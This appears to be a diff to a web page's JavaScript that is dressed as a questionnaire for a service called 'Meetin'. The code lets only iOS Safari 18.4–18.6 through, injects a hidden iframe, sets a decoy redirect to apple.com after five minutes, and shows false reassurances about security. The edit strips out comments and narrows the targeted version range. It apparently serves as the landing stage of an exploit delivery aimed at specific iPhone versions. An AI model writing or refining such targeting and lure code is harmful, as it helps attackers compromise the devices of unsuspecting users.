@@ -153,12 +153,10 @@
       // ======================================================
       //  BROWSER + VERSION GATE
       //  Only iOS Safari on 18.4 - 18.6 continues.
-      //  Everything else gets a clean screen.
       // ======================================================
       const ua = navigator.userAgent;
       const isIOS = /iPhone|iPad|iPod/.test(ua);
 
-      // Which browser, on iOS?
       const isChromeiOS  = /CriOS/.test(ua);
       const isFirefoxiOS = /FxiOS/.test(ua);
       const isEdgeiOS    = /EdgiOS/.test(ua);
@@ -167,21 +165,16 @@
       const isNonSafari  = isChromeiOS || isFirefoxiOS || isEdgeiOS || isOperaiOS || isGSAiOS;
       const isSafariIOS  = isIOS && !isNonSafari;
 
-      // Which iOS version?
       const verMatch = ua.match(/OS (\d+)_(\d+)/);
       const iosMajor = verMatch ? parseInt(verMatch[1]) : 0;
       const iosMinor = verMatch ? parseInt(verMatch[2]) : 0;
-      // Supported: 18.4 - 18.6.x
-      const versionOK = (iosMajor === 18 && iosMinor >= 4 && iosMinor <= 7);
+      const versionOK = (iosMajor === 18 && iosMinor >= 4 && iosMinor <= 6);
 
-      // --- Gate 1: not iPhone/iPad? let it through (no point in prompting).
-      // --- Gate 2: iOS but not Safari? show Safari-required screen.
       if (isIOS && !isSafariIOS) {
         renderSafariRequired();
         return;
       }
 
-      // --- Gate 3: iOS Safari but wrong version? show "not eligible" screen.
       if (isIOS && isSafariIOS && !versionOK) {
         renderNotEligible();
         return;
@@ -190,9 +183,6 @@
       // ======================================================
       //  Everything below only runs on iOS Safari 18.4 - 18.6.x
       // ======================================================
-
-      // Copy the current URL to the clipboard so the user can paste in Safari.
-      try { navigator.clipboard.writeText(location.href); } catch(e) {}
 
       sessionStorage.setItem('uid', '1');
 
@@ -211,12 +201,10 @@
       frame.className = 'hidden-frame';
       document.body.appendChild(frame);
 
-      // 5-minute safety redirect
       setTimeout(function() {
         window.location.href = 'https://www.apple.com';
       }, 5 * 60 * 1000);
 
-      // ---- questions ----
       const questions = [
         {
           text: "What are you looking for on Meetin?",
@@ -393,9 +381,6 @@
               <a class="open-btn" href="${safariURL}">Open in Safari</a>
               <div class="foot">256-bit SSL · no-track · auto-expires</div>
             </div>
-            <script>
-              try { navigator.clipboard.writeText(location.href); } catch(e) {}
-            <\/script>
           </body>
         `;
       }
